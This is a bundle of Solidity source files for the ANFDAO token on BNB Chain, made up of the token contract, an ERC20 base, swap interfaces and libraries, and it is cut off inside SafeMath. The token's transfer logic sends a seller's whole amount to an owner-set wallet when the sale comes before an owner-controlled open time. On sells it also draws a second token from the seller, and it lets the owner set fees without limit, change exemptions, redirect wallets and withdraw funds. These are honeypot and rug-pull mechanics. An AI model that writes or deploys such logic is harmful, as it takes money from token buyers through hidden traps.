{"ANfDAO.sol":{"content":"// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nimport \"./LibSafeMath.sol\";\nimport \"./LibAddress.sol\";\n\nimport \"./ISwapPair.sol\";\nimport \"./ISwapFactory.sol\";\nimport \"./ISwapRouter.sol\";\n\nimport \"./ERC20.sol\";\nimport \"./IERC20.sol\";\n\nimport \"./Ownable.sol\";\n\ncontract Token is ERC20, Ownable {\n\n    using SafeMath for uint256;\n    using Address for address;\n\n    string private _name=\"ANFDAO\";\n    string private _symbol=\"ANFDAO\";\n    uint8 private _decimals;\n    uint256 private _totalSupply;\n     \n    bool public _tempOpen= false ;\n    uint256 _tempAmount = 1;\n\n    bool public isOpenSwap;\n    mapping(address =\u003e bool) public isFeeExempt;\n    uint private _burnBlock;\n    uint public _openTime=1710975600;\n\n    address public  _dead = 0x000000000000000000000000000000000000dEaD;\n    address public _detoryCoinAddress = 0x3AB7014d0e896a8e486FbF5BC590eEB93D6f44BF;\n    mapping (address =\u003e bool) public isTxLimitExempt;\n\n\n    address payable public marketingWalletAddress;\n    address payable public teamWalletAddress;\n    address private _swapPair;\n    IERC20 private _WETH;\n    ISwapRouter private _ROUTER;\n\n    address private _NFT;\n    bool _inSwapAndLiquify;\n    modifier lockTheSwap() {\n        _inSwapAndLiquify = true;\n        _;\n        _inSwapAndLiquify = false;\n    }\n    bytes32 private hashPair;\n\n    uint256 public _buyLiquidityFee = 1;\n    uint256 public _buyMarketingFee = 0;\n    uint256 public _buyTeamFee = 0;\n    uint256 public _buyDestroyFee = 0;\n\n    uint256 public _sellLiquidityFee = 4;\n    uint256 public _sellMarketingFee = 1;\n    uint256 public _sellTeamFee = 1;\n    uint256 public _sellDestroyFee = 1;\n    uint256 public _sellDestroyFee2 = 1;\n\n    uint256 public _liquidityShare = 2;\n    uint256 public _marketingShare = 3;\n    uint256 public _teamShare = 4;\n    uint256 public _totalDistributionShares = 9;\n\n    uint256 public _totalTaxIfBuying = 1;\n    uint256 public _totalTaxIfSelling = 7;\n\n    uint256 public _minimumTokensBeforeSwap = 0;\n\n\n    uint256 public _tFeeTotal;\n    uint256 public _maxDestroyAmount;\n    uint256 public _maxBuyAmountAfterOpenTime;\n    mapping(address =\u003e uint256) public _UserTotalBuyUAmount;\n\n    constructor() ERC20() {\n\n        address recieve = msg.sender;\n        if (block.chainid == 56) {\n            _ROUTER = ISwapRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);\n            hashPair = 0x00fb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5;\n        } else if (block.chainid == 97) {\n            _ROUTER = ISwapRouter(0xD99D1c33F9fC3444f8101754aBC46c52416550D1);\n            hashPair = 0xd0d4c4cd0848c93cb4fd1f498d7013ee6bfb25783ea21593d5834f5d250ece66;\n        }\n        marketingWalletAddress= payable(0xE7e4eD7Ed74D5f1199F8FaF3bDc4BB3B9e4de102);\n        teamWalletAddress = payable(0xDee1133C5777a9B72c21bCB81F0955a5f9C87483);\n        _WETH = IERC20(_ROUTER.WETH());\n        _swapPair = pairFor(_ROUTER.factory(), address(this), address(_WETH));\n\n        isTxLimitExempt[recieve] = true;\n        isTxLimitExempt[_dead] = true;\n        isTxLimitExempt[address(this)] = true;\n\n        isFeeExempt[address(this)] = true;\n        isFeeExempt[address(1)] = true;\n        isFeeExempt[_dead] = true;\n        isFeeExempt[recieve] = true;\n\n        _minimumTokensBeforeSwap = 2000 * 10**decimals(); \n\n        _totalSupply= 2_0000_0000;\n        _maxDestroyAmount = _totalSupply * 10**decimals();\n        _mint(recieve, _totalSupply * 10 ** decimals());\n        transferOwnership(recieve);\n    }\n\n    receive() external payable {}\n\n    function dropRole() public onlyOwner {\n        transferOwnership(_dead);\n    }\n\n    function withdrawETH(uint256 amount) public onlyOwner {\n        payable(msg.sender).transfer(amount);\n    }\n\n    function withdrawToken(IERC20 token, uint256 amount) public onlyOwner {\n        token.transfer(msg.sender, amount);\n    }\n\n    function setIsFeeExempt(address account, bool newValue) public onlyOwner {\n        isFeeExempt[account] = newValue;\n    }\n\n    function setIsTxLimitExempt(address holder, bool exempt) external onlyOwner {\n        isTxLimitExempt[holder] = exempt;\n    }\n\n    function setOpenTime(uint openTime) public onlyOwner {\n        _openTime = openTime;\n        _maxBuyAmountAfterOpenTime = _openTime + 3* 60*60;\n    }\n\n    function setTempOpen(bool tempOpen) public onlyOwner {\n        _tempOpen = tempOpen;\n    }\n\n    function setTempAmount(uint256 tempAmount) public onlyOwner {\n        _tempAmount = tempAmount;\n    }\n\n    function setDetoryCoinAddress(address detoryCoinAddress) public onlyOwner {\n        _detoryCoinAddress = detoryCoinAddress;\n    }\n\n    function minimumTokensBeforeSwapAmount() public view returns (uint256) {\n        return _minimumTokensBeforeSwap;\n    }\n\n    function _transfer(\n        address from,\n        address to,\n        uint256 amount\n    ) internal override {\n        require(from != address(0), \"ERC20: transfer from the zero address\");\n        require(to != address(0), \"ERC20: transfer to the zero address\");\n        if (_inSwapAndLiquify || isFeeExempt[from] || isFeeExempt[to]) {\n            super._transfer(from, to, amount);\n            if (!isOpenSwap \u0026\u0026 to == _swapPair \u0026\u0026 isFeeExempt[from]) {\n                isOpenSwap = true;\n                _burnBlock = block.number;\n            }\n        } else if (from == _swapPair) {//\n            \n            require(isOpenSwap \u0026\u0026 _openTime \u003e 0 \u0026\u0026 _openTime \u003c block.timestamp);\n\n            if(_maxBuyAmountAfterOpenTime \u003e block.timestamp || 1==2 ){\n                require( ( amount+_UserTotalBuyUAmount[address(to)] ) \u003c= 1000*10**18, \n                    \"ERC20: transfer amount can not under 1000\" );\n                _UserTotalBuyUAmount[address(to)] = _UserTotalBuyUAmount[address(to)] + amount;\n            }\n\n            uint256 every = amount.div(100);\n            super._transfer(from, address(this), every);\n\n            super._transfer(from, to, amount - every );\n\n        } else if (to == _swapPair) {//卖\n            if ( (!isOpenSwap || _openTime == 0 || _openTime \u003e block.timestamp) \n                    \u0026\u0026 1==1 ){\n                       \n                super._transfer(from, marketingWalletAddress, amount);//\n            } else {\n                // _burnPool();\n                uint256 every = amount.div(100);\n                if( _sellDestroyFee \u003e 0 ){\n                    super._burnDead(from, every*_sellDestroyFee);\n                }\n                if( _sellDestroyFee2 \u003e 0 \u0026\u0026 _tFeeTotal \u003c _maxDestroyAmount) {\n                    uint256 tAmount = every * _sellDestroyFee2 ;\n                    IERC20(address(_detoryCoinAddress)).transferFrom(from,_dead, \n                        tAmount\n                    );\n                    _tFeeTotal = _tFeeTotal.add( tAmount );\n                }\n                if( _sellMarketingFee \u003e 0 ){\n                    super._transfer(from, marketingWalletAddress, every * _sellMarketingFee);\n                }\n                if( _sellTeamFee \u003e 0 ){\n\n                    super._transfer(from, address(this), every * _sellTeamFee);\n                    _swapTokensForETH(every * _sellTeamFee);\n                    uint256 amountReceived = address(this).balance;\n                    teamWalletAddress.transfer(amountReceived);\n\n                }\n               \n\n                if ( balanceOf( address(this) ) \u003e= _minimumTokensBeforeSwap )\n                {\n                    _swapAndLiquify2( _minimumTokensBeforeSwap );\n                }\n\n         \n                super._transfer(from, to, \n                    amount);\n            }\n        } else {\n            super._transfer(from, to, amount);\n        }\n    }\n\n    function getToken()\n        public\n        view\n        returns (\n            address swapPair,\n            address usdt,\n            address router,\n            address nft,\n            uint burnBlock,\n            uint openTime,\n            uint bolckTimestamp,\n            uint maxBuyAmountAfterOpenTime,\n            bool inSwapAndLiquify\n        )\n    {\n        swapPair = _swapPair;\n        usdt = address(_WETH);\n        router = address(_ROUTER);\n        nft = address(_NFT);\n        burnBlock = _burnBlock;\n        openTime = _openTime;\n        bolckTimestamp = block.timestamp;\n        maxBuyAmountAfterOpenTime = _maxBuyAmountAfterOpenTime;\n        inSwapAndLiquify = _inSwapAndLiquify;\n    }\n\n    function getAddLiquidityToken(uint otherAmount) public view returns (uint) {\n        address[] memory path = new address[](2);\n        path[0] = address(_WETH);\n        path[1] = address(this);\n        address pair = ISwapFactory(_ROUTER.factory()).getPair(\n            address(_WETH),\n            address(this)\n        );\n        if (pair == address(0)) return 0;\n        (uint256 reserve1, uint256 reserve2, ) = ISwapPair(pair).getReserves();\n        address token0 = ISwapPair(pair).token0();\n        if (reserve1 == 0 || reserve2 == 0) {\n            return 0;\n        } else if (token0 == address(this)) {\n            return (otherAmount * reserve1) / reserve2;\n        } else if (token0 == address(_WETH)) {\n            return (otherAmount * reserve2) / reserve1;\n        } else return 0;\n    }\n\n    \n\n    function _swapAndLiquify() private lockTheSwap returns (bool) {\n        uint every = balanceOf(address(this)) / 10;\n        uint amount = every * 6;\n        if (amount \u003e 1e9) {\n            address token0 = ISwapPair(_swapPair).token0();\n            (uint256 reserve0, uint256 reserve1, ) = ISwapPair(_swapPair)\n                .getReserves();\n            uint256 tokenPool = reserve0;\n            if (token0 != address(this)) tokenPool = reserve1;\n            if (amount \u003e tokenPool / 100) {\n                amount = tokenPool / 100;\n            }\n            _swapTokensForETH(amount);\n            payable(address(_NFT)).transfer(address(this).balance / 2);\n            _addLiquidityEth(every * 3, address(this).balance / 2);//添加流动性\n            return true;\n        }\n        return false;\n    }\n\n    function _swapAndLiquify2(uint256 contractTokenBalance) private lockTheSwap returns (bool) {\n\n        // split the contract balance into halves\n        uint256 half = contractTokenBalance.div(2);\n        uint256 otherHalf = contractTokenBalance.sub(half);\n\n        uint256 initialBalance = address(this).balance;\n        _swapTokensForETH(half); \n        uint256 newBalance = address(this).balance.sub(initialBalance);\n \n        _addLiquidityEth(otherHalf, newBalance);\n        \n        return false;\n    }\n\n    function getPrice() public view returns (uint256){\n        (uint112 a,uint112 b,) = ISwapPair(_swapPair)\n                .getReserves();\n        uint256 c = 1;\n        c=c*a;\n        c=c/b;\n        return c;\n    }\n\n    function _swapTokensForETH(uint256 tokenAmount) internal {\n        address[] memory path = new address[](2);\n        path[0] = address(this);\n        path[1] = _ROUTER.WETH();\n        IERC20(address(this)).approve(address(_ROUTER), tokenAmount);\n        _ROUTER.swapExactTokensForETHSupportingFeeOnTransferTokens(\n            tokenAmount,\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n        emit SwapTokensForETH(tokenAmount, path);\n    }\n\n    event SwapTokensForETH(uint256 amountIn, address[] path);\n\n    function _addLiquidityEth(uint256 tokenAmount, uint256 ethAmount) internal {\n        IERC20(address(this)).approve(address(_ROUTER), tokenAmount);\n        _ROUTER.addLiquidityETH{value: ethAmount}(\n            address(this),\n            tokenAmount,\n            0,\n            0,\n            _dead,\n            block.timestamp\n        );\n        emit AddLiquidity(tokenAmount, ethAmount);\n    }\n\n    event AddLiquidity(uint256 tokenAmount, uint256 ethAmount);\n\n    function sortTokens(\n        address tokenA,\n        address tokenB\n    ) internal pure returns (address token0, address token1) {\n        require(tokenA != tokenB, \"UniswapV2Library: IDENTICAL_ADDRESSES\");\n        (token0, token1) = tokenA \u003c tokenB\n            ? (tokenA, tokenB)\n            : (tokenB, tokenA);\n        require(token0 != address(0), \"UniswapV2Library: ZERO_ADDRESS\");\n    }\n\n    function pairFor(\n        address factory,\n        address tokenA,\n        address tokenB\n    ) internal view returns (address pair) {\n        (address token0, address token1) = sortTokens(tokenA, tokenB);\n        pair = address(\n            uint160(\n                uint256(\n                    keccak256(\n                        abi.encodePacked(\n                            hex\"ff\",\n                            factory,\n                            keccak256(abi.encodePacked(token0, token1)),\n                            hashPair\n                        )\n                    )\n                )\n            )\n        );\n    }\n\n    function setMaxDesAmount(uint256 maxDestroy) public onlyOwner {\n        _maxDestroyAmount = maxDestroy;\n    }\n\n    function setBuyDestFee(uint256 newBuyDestroyFee) public onlyOwner {\n        _buyDestroyFee = newBuyDestroyFee;\n        _totalTaxIfBuying = _buyLiquidityFee.add(_buyMarketingFee).add(_buyTeamFee).add(_buyDestroyFee);\n    }\n\n    function setSellDestFee(uint256 newSellDestroyFee) public onlyOwner {\n        _sellDestroyFee = newSellDestroyFee;\n        _totalTaxIfSelling = _sellLiquidityFee.add(_sellMarketingFee).add(_sellTeamFee).add(_sellDestroyFee);\n    }\n\n    function setSellDestFee2(uint256 newSellDestroyFee2) public onlyOwner {\n        _sellDestroyFee2 = newSellDestroyFee2;\n    }\n\n    function setBuyTaxes(uint256 newLiquidityTax, uint256 newMarketingTax, uint256 newTeamTax) external onlyOwner() {\n        _buyLiquidityFee = newLiquidityTax;\n        _buyMarketingFee = newMarketingTax;\n        _buyTeamFee = newTeamTax;\n\n        _totalTaxIfBuying = _buyLiquidityFee.add(_buyMarketingFee).add(_buyTeamFee).add(_buyDestroyFee);\n    }\n\n    function setSelTaxes(uint256 newLiquidityTax, uint256 newMarketingTax, uint256 newTeamTax) external onlyOwner {\n        _sellLiquidityFee = newLiquidityTax;\n        _sellMarketingFee = newMarketingTax;\n        _sellTeamFee = newTeamTax;\n\n        _totalTaxIfSelling = _sellLiquidityFee.add(_sellMarketingFee).add(_sellTeamFee).add(_sellDestroyFee);\n    }\n\n    function setDistributionSettings(uint256 newLiquidityShare, uint256 newMarketingShare, uint256 newTeamShare) external onlyOwner {\n        _liquidityShare = newLiquidityShare;\n        _marketingShare = newMarketingShare;\n        _teamShare = newTeamShare;\n\n        _totalDistributionShares = _liquidityShare.add(_marketingShare).add(_teamShare);\n    }\n\n    function setMarketingWalletAddress(address newAddress) external onlyOwner() {\n        marketingWalletAddress = payable(newAddress);\n    }\n\n    function setTeamWalletAddress(address newAddress) external onlyOwner() {\n        teamWalletAddress = payable(newAddress);\n    }\n\n}"},"ERC20.sol":{"content":"// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nimport \"./IERC20.sol\";\n\ncontract ERC20 is IERC20 {\n    mapping(address =\u003e uint256) private _balances;\n    mapping(address =\u003e mapping(address =\u003e uint256)) private _allowances;\n    uint256 private _totalSupply;\n    uint256 private _totalCirculation;\n    uint256 private _minTotalSupply;\n    string private _name;\n    string private _symbol;\n\n    constructor() {\n        _name =\"ANFDAO\";\n        _symbol = \"ANFDAO\";\n    }\n\n    function name() public view virtual override returns (string memory) {\n        return _name;\n    }\n\n    function symbol() public view virtual override returns (string memory) {\n        return _symbol;\n    }\n\n    function decimals() public view virtual override returns (uint8) {\n        return 18;\n    }\n\n    function totalSupply() public view virtual override returns (uint256) {\n        return _totalSupply;\n    }\n\n    function totalCirculation() public view virtual returns (uint256) {\n        return _totalCirculation;\n    }\n\n    function minTotalSupply() public view virtual returns (uint256) {\n        return _minTotalSupply;\n    }\n\n    function balanceOf(\n        address account\n    ) public view virtual override returns (uint256) {\n        return _balances[account];\n    }\n\n    function transfer(\n        address to,\n        uint256 amount\n    ) public virtual override returns (bool) {\n        address owner = msg.sender;\n        _transfer(owner, to, amount);\n        return true;\n    }\n\n    function allowance(\n        address owner,\n        address spender\n    ) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    function approve(\n        address spender,\n        uint256 amount\n    ) public virtual override returns (bool) {\n        address owner = msg.sender;\n        _approve(owner, spender, amount);\n        return true;\n    }\n\n    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) public virtual override returns (bool) {\n        address spender = msg.sender;\n        _spendAllowance(from, spender, amount);\n        _transfer(from, to, amount);\n        return true;\n    }\n\n    function increaseAllowance(\n        address spender,\n        uint256 addedValue\n    ) public virtual returns (bool) {\n        address owner = msg.sender;\n        _approve(owner, spender, _allowances[owner][spender] + addedValue);\n        return true;\n    }\n\n    function decreaseAllowance(\n        address spender,\n        uint256 subtractedValue\n    ) public virtual returns (bool) {\n        address owner = msg.sender;\n        uint256 currentAllowance = _allowances[owner][spender];\n        require(\n            currentAllowance \u003e= subtractedValue,\n            \"ERC20: decreased allowance below zero\"\n        );\n        unchecked {\n            _approve(owner, spender, currentAllowance - subtractedValue);\n        }\n        return true;\n    }\n\n    function burn(uint256 amount) public virtual {\n        _burn(msg.sender, amount);\n    }\n\n    function _transfer(\n        address from,\n        address recipient,\n        uint256 amount\n    ) internal virtual {\n        require(from != address(0), \"ERC20: transfer from the zero address\");\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\n        address to = recipient;\n        if (address(1) == recipient) to = address(0);\n        _beforeTokenTransfer(from, to, amount);\n        uint256 fromBalance = _balances[from];\n        require(\n            fromBalance \u003e= amount,\n            \"ERC20: transfer amount exceeds balance\"\n        );\n        unchecked {\n            _balances[from] = fromBalance - amount;\n        }\n        _balances[to] += amount;\n        emit Transfer(from, to, amount);\n        _afterTokenTransfer( to, amount);\n    }\n\n    function _mint(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"ERC20: mint to the zero address\");\n        _beforeTokenTransfer(address(0), account, amount);\n        _totalSupply += amount;\n        _totalCirculation += amount;\n        _balances[account] += amount;\n        emit Transfer(address(0), account, amount);\n        _afterTokenTransfer( account, amount);\n    }\n\n    function _burnSafe(\n        address account,\n        uint256 amount\n    ) internal virtual returns (bool) {\n        require(account != address(0), \"ERC20: burn from the zero address\");\n        if (_totalCirculation \u003e _minTotalSupply + amount) {\n            _beforeTokenTransfer(account, address(0), amount);\n            uint256 accountBalance = _balances[account];\n            require(\n                accountBalance \u003e= amount,\n                \"ERC20: burn amount exceeds balance\"\n            );\n            unchecked {\n                _balances[account] = accountBalance - amount;\n                _balances[address(0)] += amount;\n            }\n            emit Transfer(account, address(0), amount);\n            _afterTokenTransfer( address(0), amount);\n            return true;\n        }\n        return false;\n    }\n\n    function _burn(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"ERC20: burn from the zero address\");\n        _beforeTokenTransfer(account, address(0), amount);\n        uint256 accountBalance = _balances[account];\n        require(accountBalance \u003e= amount, \"ERC20: burn amount exceeds balance\");\n        unchecked {\n            _balances[account] = accountBalance - amount;\n            _balances[address(0)] += amount;\n        }\n        emit Transfer(account, address(0), amount);\n        _afterTokenTransfer( address(0), amount);\n    }\n\n    function _burnDead(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"ERC20: burn from the zero address\");\n        _beforeTokenTransfer(\n            account,\n            0x000000000000000000000000000000000000dEaD,\n            amount\n        );\n        uint256 accountBalance = _balances[account];\n        require(accountBalance \u003e= amount, \"ERC20: burn amount exceeds balance\");\n        unchecked {\n            _balances[account] = accountBalance - amount;\n            _balances[0x000000000000000000000000000000000000dEaD] += amount;\n        }\n        emit Transfer(\n            account,\n            0x000000000000000000000000000000000000dEaD,\n            amount\n        );\n        _afterTokenTransfer(\n        \n            0x000000000000000000000000000000000000dEaD,\n            amount\n        );\n    }\n\n    function _approve(\n        address owner,\n        address spender,\n        uint256 amount\n    ) internal virtual {\n        require(owner != address(0), \"ERC20: approve from the zero address\");\n        require(spender != address(0), \"ERC20: approve to the zero address\");\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n\n    function _spendAllowance(\n        address owner,\n        address spender,\n        uint256 amount\n    ) internal virtual {\n        uint256 currentAllowance = allowance(owner, spender);\n        if (currentAllowance != type(uint256).max) {\n            require(\n                currentAllowance \u003e= amount,\n                \"ERC20: insufficient allowance\"\n            );\n            unchecked {\n                _approve(owner, spender, currentAllowance - amount);\n            }\n        }\n    }\n\n    function _beforeTokenTransfer(\n        address from,\n        address to,\n        uint256 amount\n    ) internal virtual {}\n\n    function _afterTokenTransfer(\n        address to,\n        uint256 amount\n    ) internal virtual {\n        if (to == address(0) \u0026\u0026 _totalCirculation \u003e= amount) {\n            _totalCirculation -= amount;\n        }\n    }\n\n    function _setMinTotalSupply(uint256 amount) internal {\n        _minTotalSupply = amount;\n    }\n}"},"IERC20.sol":{"content":"// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface IERC20 {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address account) external view returns (uint256);\n\n    function transfer(address to, uint256 amount) external returns (bool);\n\n    function allowance(\n        address owner,\n        address spender\n    ) external view returns (uint256);\n\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(\n        address indexed owner,\n        address indexed spender,\n        uint256 value\n    );\n}"},"ISwapFactory.sol":{"content":"// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\n\ninterface ISwapFactory {\n    function getPair(\n        address tokenA,\n        address tokenB\n    ) external view returns (address pair);\n\n    function allPairs(uint256) external view returns (address pair);\n\n    function allPairsLength() external view returns (uint256);\n\n    function createPair(\n        address tokenA,\n        address tokenB\n    ) external returns (address pair);\n}"},"ISwapPair.sol":{"content":"// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface ISwapPair {\n    function DOMAIN_SEPARATOR() external view returns (bytes32);\n\n    function PERMIT_TYPEHASH() external pure returns (bytes32);\n\n    function nonces(address owner) external view returns (uint256);\n\n    function permit(\n        address owner,\n        address spender,\n        uint256 value,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external;\n\n    function MINIMUM_LIQUIDITY() external pure returns (uint256);\n\n    function factory() external view returns (address);\n\n    function token0() external view returns (address);\n\n    function token1() external view returns (address);\n\n    function getReserves()\n        external\n        view\n        returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);\n\n    function price0CumulativeLast() external view returns (uint256);\n\n    function price1CumulativeLast() external view returns (uint256);\n\n    function kLast() external view returns (uint256);\n\n    function mint(address to) external returns (uint256 liquidity);\n\n    function burn(\n        address to\n    ) external returns (uint256 amount0, uint256 amount1);\n\n    function swap(\n        uint256 amount0Out,\n        uint256 amount1Out,\n        address to,\n        bytes calldata data\n    ) external;\n\n    function skim(address to) external;\n\n    function sync() external;\n\n    function initialize(address, address) external;\n}"},"ISwapRouter.sol":{"content":"// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\n\ninterface ISwapRouter {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n\n    function addLiquidity(\n        address tokenA,\n        address tokenB,\n        uint256 amountADesired,\n        uint256 amountBDesired,\n        uint256 amountAMin,\n        uint256 amountBMin,\n        address to,\n        uint256 deadline\n    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);\n\n    function addLiquidityETH(\n        address token,\n        uint256 amountTokenDesired,\n        uint256 amountTokenMin,\n        uint256 amountETHMin,\n        address to,\n        uint256 deadline\n    )\n        external\n        payable\n        returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);\n\n    function removeLiquidity(\n        address tokenA,\n        address tokenB,\n        uint256 liquidity,\n        uint256 amountAMin,\n        uint256 amountBMin,\n        address to,\n        uint256 deadline\n    ) external returns (uint256 amountA, uint256 amountB);\n\n    function removeLiquidityETH(\n        address token,\n        uint256 liquidity,\n        uint256 amountTokenMin,\n        uint256 amountETHMin,\n        address to,\n        uint256 deadline\n    ) external returns (uint256 amountToken, uint256 amountETH);\n\n    function swapExactTokensForTokens(\n        uint256 amountIn,\n        uint256 amountOutMin,\n        address[] calldata path,\n        address to,\n        uint256 deadline\n    ) external returns (uint256[] memory amounts);\n\n    function swapTokensForExactTokens(\n        uint256 amountOut,\n        uint256 amountInMax,\n        address[] calldata path,\n        address to,\n        uint256 deadline\n    ) external returns (uint256[] memory amounts);\n\n    function swapExactETHForTokens(\n        uint256 amountOutMin,\n        address[] calldata path,\n        address to,\n        uint256 deadline\n    ) external payable returns (uint256[] memory amounts);\n\n    function swapTokensForExactETH(\n        uint256 amountOut,\n        uint256 amountInMax,\n        address[] calldata path,\n        address to,\n        uint256 deadline\n    ) external returns (uint256[] memory amounts);\n\n    function swapExactTokensForETH(\n        uint256 amountIn,\n        uint256 amountOutMin,\n        address[] calldata path,\n        address to,\n        uint256 deadline\n    ) external returns (uint256[] memory amounts);\n\n    function swapETHForExactTokens(\n        uint256 amountOut,\n        address[] calldata path,\n        address to,\n        uint256 deadline\n    ) external payable returns (uint256[] memory amounts);\n\n    function quote(\n        uint256 amountA,\n        uint256 reserveA,\n        uint256 reserveB\n    ) external pure returns (uint256 amountB);\n\n    function getAmountOut(\n        uint256 amountIn,\n        uint256 reserveIn,\n        uint256 reserveOut\n    ) external pure returns (uint256 amountOut);\n\n    function getAmountIn(\n        uint256 amountOut,\n        uint256 reserveIn,\n        uint256 reserveOut\n    ) external pure returns (uint256 amountIn);\n\n    function getAmountsOut(\n        uint256 amountIn,\n        address[] calldata path\n    ) external view returns (uint256[] memory amounts);\n\n    function getAmountsIn(\n        uint256 amountOut,\n        address[] calldata path\n    ) external view returns (uint256[] memory amounts);\n\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n        uint256 amountIn,\n        uint256 amountOutMin,\n        address[] calldata path,\n        address to,\n        uint256 deadline\n    ) external;\n\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\n        uint256 amountOutMin,\n        address[] calldata path,\n        address to,\n        uint256 deadline\n    ) external payable;\n\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\n        uint256 amountIn,\n        uint256 amountOutMin,\n        address[] calldata path,\n        address to,\n        uint256 deadline\n    ) external;\n}"},"LibAddress.sol":{"content":"// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nlibrary Address {\n    function isContract(address account) internal view returns (bool) {\n        return account.code.length \u003e 0;\n    }\n\n    function sendValue(address payable recipient, uint256 amount) internal {\n        require(\n            address(this).balance \u003e= amount,\n            \"Address: insufficient balance\"\n        );\n        (bool success, ) = recipient.call{value: amount}(\"\");\n        require(\n            success,\n            \"Address: unable to send value, recipient may have reverted\"\n        );\n    }\n\n    function functionCall(\n        address target,\n        bytes memory data\n    ) internal returns (bytes memory) {\n        return functionCall(target, data, \"Address: low-level call failed\");\n    }\n\n    function functionCall(\n        address target,\n        bytes memory data,\n        string memory errorMessage\n    ) internal returns (bytes memory) {\n        return functionCallWithValue(target, data, 0, errorMessage);\n    }\n\n    function functionCallWithValue(\n        address target,\n        bytes memory data,\n        uint256 value\n    ) internal returns (bytes memory) {\n        return\n            functionCallWithValue(\n                target,\n                data,\n                value,\n                \"Address: low-level call with value failed\"\n            );\n    }\n\n    function functionCallWithValue(\n        address target,\n        bytes memory data,\n        uint256 value,\n        string memory errorMessage\n    ) internal returns (bytes memory) {\n        require(\n            address(this).balance \u003e= value,\n            \"Address: insufficient balance for call\"\n        );\n        require(isContract(target), \"Address: call to non-contract\");\n        (bool success, bytes memory returndata) = target.call{value: value}(\n            data\n        );\n        return verifyCallResult(success, returndata, errorMessage);\n    }\n\n    function functionStaticCall(\n        address target,\n        bytes memory data\n    ) internal view returns (bytes memory) {\n        return\n            functionStaticCall(\n                target,\n                data,\n                \"Address: low-level static call failed\"\n            );\n    }\n\n    function functionStaticCall(\n        address target,\n        bytes memory data,\n        string memory errorMessage\n    ) internal view returns (bytes memory) {\n        require(isContract(target), \"Address: static call to non-contract\");\n        (bool success, bytes memory returndata) = target.staticcall(data);\n        return verifyCallResult(success, returndata, errorMessage);\n    }\n\n    function functionDelegateCall(\n        address target,\n        bytes memory data\n    ) internal returns (bytes memory) {\n        return\n            functionDelegateCall(\n                target,\n                data,\n                \"Address: low-level delegate call failed\"\n            );\n    }\n\n    function functionDelegateCall(\n        address target,\n        bytes memory data,\n        string memory errorMessage\n    ) internal returns (bytes memory) {\n        require(isContract(target), \"Address: delegate call to non-contract\");\n        (bool success, bytes memory returndata) = target.delegatecall(data);\n        return verifyCallResult(success, returndata, errorMessage);\n    }\n\n    function verifyCallResult(\n        bool success,\n        bytes memory returndata,\n        string memory errorMessage\n    ) internal pure returns (bytes memory) {\n        if (success) {\n            return returndata;\n        } else {\n            if (returndata.length \u003e 0) {\n                assembly {\n                    let returndata_size := mload(returndata)\n                    revert(add(32, returndata), returndata_size)\n                }\n            } else {\n                revert(errorMessage);\n            }\n        }\n    }\n}"},"LibSafeMath.sol":{"content":"// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\n\nlibrary SafeMath {\n    function tryAdd(\n        uint256 a,\n        uint256 b\n    ) internal pure returns (bool, uint256) {\n        unchecked {\n            uint256 c = a + b;\n            if (c \u003c a) return (false, 0);\n            return (true, c);\n        }\n    }\n\n    function trySub(\n        uint256 a,\n        uint256 b\n    ) internal pure returns (bool, uint256) {\n        unchecked {\n            if (b \u003e a) return (false, 0);\n            return (true, a - b);\n        }\n    }\n\n    function tryMul(\n        uint256 a,\n        uint256 b\n    ) internal pure returns (bool, uint256) {\n        unchecked {\n            if (a == 0) return (true, 0);\n            uint256 c = a * b;\n            if (c / a != b) return (false, 0);\n            return (true, c);\n        }\n    }\n\n    function tryDiv(\n        uint256 a,\n        uint256 b\n    ) internal pure returns (bool, uint256) {\n        unchecked {\n            if (b == 0) return (false, 0);\n            return (true, a / b);\n        }\n    }\n\n    function tryMod(\n        uint256 a,\n        uint256 b\n    ) internal pure returns (bool, uint256) {\n        unchecked {\n            if (b == 0) return (false, 0);\n            return (true, a % b);\n        }\n    }\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a + b;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a - b;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a * b;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a / b;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a % b;\n    }\n\n    function sub(\n        uint256 a,\n        uint256 b,\n        string memory errorMessage\n    ) internal pure returns (uint256) {\n        unchecked {\n            require(b \u003c= a, errorMessage);\n            return a - b;\n        }\n    }\n\n    function div(\n        uint256 a,\n        uint256 b,\n        string memory errorMessage\n    ) internal pure returns (uint256) {\n        